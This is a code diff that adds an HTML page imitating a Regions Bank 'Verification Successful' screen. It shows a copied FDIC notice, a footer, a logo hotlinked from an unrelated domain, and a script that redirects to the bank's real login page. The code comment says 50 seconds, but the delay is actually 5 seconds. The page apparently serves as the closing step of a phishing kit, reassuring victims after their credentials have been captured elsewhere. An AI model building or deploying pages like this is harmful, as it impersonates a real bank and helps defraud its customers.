@@ -1,0 +1,209 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Regions Bank - Success</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background-color: #ffffff;
+    color: #1a1a1a;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 40px 20px;
+    min-height: 100vh;
+  }
+
+  .logo { text-align: center; margin-bottom: 15px; }
+  .logo img { height: 50px; max-width: 100%; }
+
+  .heading {
+    font-size: 2.4rem;
+    font-weight: 400;
+    text-align: center;
+    margin-bottom: 10px;
+  }
+
+  .subheading {
+    font-size: 1.1rem;
+    text-align: center;
+    font-weight: 500;
+    margin-bottom: 30px;
+    color: #555;
+  }
+
+  .login-box {
+    background: #fff;
+    border-radius: 20px;
+    padding: 50px 25px;
+    box-shadow: 0 0 9px rgba(0, 0, 0, 0.08);
+    width: 100%;
+    max-width: 420px;
+    text-align: center;
+    margin-bottom: 40px;
+  }
+
+  /* Spinner */
+  .spinner {
+    width: 80px;
+    height: 80px;
+    border: 8px solid #f3f3f3;
+    border-top: 8px solid #3d6f1b;
+    border-radius: 50%;
+    animation: spin 1.5s linear infinite;
+    margin: 0 auto 20px;
+  }
+
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+
+  .message {
+    font-size: 1.2rem;
+    color: #333;
+  }
+
+  /* Footer Section */
+  footer {
+    width: 100%;
+    background-color: #f7f7f7;
+    color: #333;
+    font-size: 14px;
+    padding: 30px 20px;
+    border-top: 1px solid #ddd;
+    margin-top: auto;
+  }
+
+  .footer-container {
+    max-width: 1000px;
+    margin: 0 auto;
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: space-between;
+    gap: 20px;
+    text-align: center;
+  }
+
+  .footer-section {
+    flex: 1 1 200px;
+    min-width: 180px;
+  }
+
+  .footer-section h4 {
+    font-size: 15px;
+    font-weight: 700;
+    margin-bottom: 10px;
+    color: #1a1a1a;
+  }
+
+  .footer-section ul {
+    list-style: none;
+    padding: 0;
+  }
+
+  .footer-section ul li {
+    margin: 6px 0;
+  }
+
+  .footer-section ul li a {
+    color: #007f7f;
+    text-decoration: none;
+  }
+
+  .footer-section ul li a:hover {
+    text-decoration: underline;
+  }
+  .fdic-text {
+      font-size: 13px;
+      color: #333;
+      text-align: center;
+      margin-bottom: 30px;
+    }
+
+  .footer-bottom {
+    text-align: center;
+    margin-top: 25px;
+    color: #666;
+    font-size: 13px;
+  }
+
+  /* Responsive */
+  @media (max-width: 480px) {
+    .heading { font-size: 22px; }
+    .subheading { font-size: 14px; }
+    footer { font-size: 13px; padding: 25px 15px; }
+    .footer-container { flex-direction: column; align-items: center; gap: 25px; }
+  }
+</style>
+</head>
+<body>
+
+  <div class="logo">
+    <img src="https://thebanks.eu/img/logos/Regions_Bank.png" alt="Regions Bank Logo" />
+  </div>
+
+  <div class="fdic-text">
+    <strong>FDIC</strong> FDIC-Insured – Backed by the full faith and credit of the U.S. Government
+  </div>
+
+  <div class="heading">Verification Successful</div>
+  <div class="subheading">Please wait while we complete the process...</div>
+
+  <div class="login-box">
+    <div class="spinner"></div>
+    <div class="message">This may take a few moments.</div>
+  </div>
+
+  <!-- Footer Section -->
+  <footer>
+    <div class="footer-container">
+      <div class="footer-section">
+        <h4>Customer Service</h4>
+        <ul>
+          <li><a href="#">Contact Us</a></li>
+          <li><a href="#">Find a Branch</a></li>
+          <li><a href="#">Report Fraud</a></li>
+          <li><a href="#">Help & Support</a></li>
+        </ul>
+      </div>
+
+      <div class="footer-section">
+        <h4>Resources</h4>
+        <ul>
+          <li><a href="#">Privacy Policy</a></li>
+          <li><a href="#">Security Center</a></li>
+          <li><a href="#">Accessibility</a></li>
+          <li><a href="#">Terms & Conditions</a></li>
+        </ul>
+      </div>
+
+      <div class="footer-section">
+        <h4>Connect With Us</h4>
+        <ul>
+          <li><a href="#">Facebook</a></li>
+          <li><a href="#">Twitter</a></li>
+          <li><a href="#">Instagram</a></li>
+          <li><a href="#">LinkedIn</a></li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="footer-bottom">
+      © 2025 Regions Bank. Member FDIC. Equal Housing Lender.
+    </div>
+  </footer>
+
+  <script>
+    // Redirect after 50 seconds (50 * 1000 ms)
+    setTimeout(() => {
+      window.location.href = "https://login.regions.com/signin?channel=olb&product=accountoverview";
+    }, 5000);
+  </script>
+</body>
+</html>
